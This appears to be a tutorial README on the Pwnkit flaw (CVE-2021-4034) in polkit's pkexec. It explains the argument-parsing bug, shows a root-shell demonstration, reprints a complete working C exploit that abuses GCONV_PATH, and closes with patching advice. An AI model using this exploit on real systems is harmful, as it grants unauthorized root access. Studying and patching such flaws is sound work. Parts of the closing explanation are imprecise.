# Pwnkit Vulnerability - CVE-2021-4034 :green_book:

 ### Introduction

Discovered in 2021 but announced and disclosed in January 2022, **CVE-2021-4034** was affectionately named Pwnkit, however, it is available in all versions of the **Policy Toolkit - Polkit package** in practically all OS - Linux distributions. In short, this vulnerability allows any unprivileged attacker to vertically elevate their access to OS administrator.

> [!IMPORTANT]
> We can find this vulnerability in pkexec version 0.105 or earlier.

Even though it is a highly critical CVE, classified with a  **<font color="red">CVSS score of 7.8 points</font>** according to **NIST.GOV**, it is only exploited locally, that is, it is not possible to exploit it remotely (Web access).


<p align="center">
  <img width="400" height="300" src="./img/1.png">
</p>

### What is Polkit :question:

Polkit acts as a Linux authorization system. When you have a user who has little privilege and needs to perform some task that needs high privilege (admin for example), polkit checks if your user has required permission.

For example, with the PKexec utilitarian, we can call the polkit function, which checks permission and asks for password if it does not have. As in the example below;

<p align="center">
  <img width="500" height="190" src="./img/2.png">
</p>


## Explaining the Exploration :warning:

As shown above, Pwnkit vulnerability exists in PKexec (in the permission checking process), for this vulnerability, there is no security in the deals with parameters when PKexec is performed by command line (CLI), where it allows the invader to manipulate the environment And a flaw occurs called **"Out-of-Bounds Write"**.

The PKexec attempts to parse any command-line arguments that we pass it using a for-loop, starting at an index of 1 to offset the name of the program and obtain the first real argument. The name of the program is irrelevant to argument parsing, so the indexing is simply offset to ignore it. 

So if we do not define any arguments, the index is automatically defined to 1. 

Let's create an example below.

```
for(n=1; n < number_of_arguments; n++){
}
```
If the number of arguments is 0 then 'N' is never less than the number of arguments. As such, 'N' stays equal to one and the loop is **<font color="green">Bypassed Completely</font>** , the loop will not happen.

As there are no command-line arguments, there is no argument at index n — instead the program overwrites the next thing in memory, which just so happens to be the first value in the list of environment variables when the program is called using a C function called execve(). In other words, by passing PKexec a null list of arguments, we can force it to overwrite an environment.

## Let's Explore !!! :pencil2:

There are several ways and various internet scripts that easily exploit this vulnerability. To customize time, we will use a script created in C executing this vulnerability of our friend **Arthepsy's** repository.

This script explores the variable ```GCONV_PATH``` to include a shared object that calls /bin/sh as root.

[Arthepsy - CVE-2021-4034 - exploit.c](https://github.com/arthepsy/CVE-2021-4034)



Before you run the script, we will check your access to the vulnerable host.

<p align="center">
  <img width="500" height="100" src="./img/3.png">
</p>

We have a 1000 user (no root) and we can't perform specifying administrator functions, such as Useradd.

* Let's Burn :fire:

<p align="center">
  <img width="500" height="150" src="./img/4.png">
</p>

We got access to the root user and managed to execute some functions like Useradd (the error refers to another problem, but we were able to perform the process as root).

Done :heavy_check_mark:

## Just a Little More Analysis :bulb:

To conclude this exploration, we can quickly take a look at the script exploit below;

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```
It basically exploits the previously commented PKexec arguments and rewrites the ```GCONV_PATH``` environment variable with /bin/sh and setting stuid(0) (root).

## Patching :white_check_mark:

There are already corrected versions available on the OS package itself, performing only the ```sudo apt update && sudo apt upgrade``` commands, it is already possible to correct this problem of your system.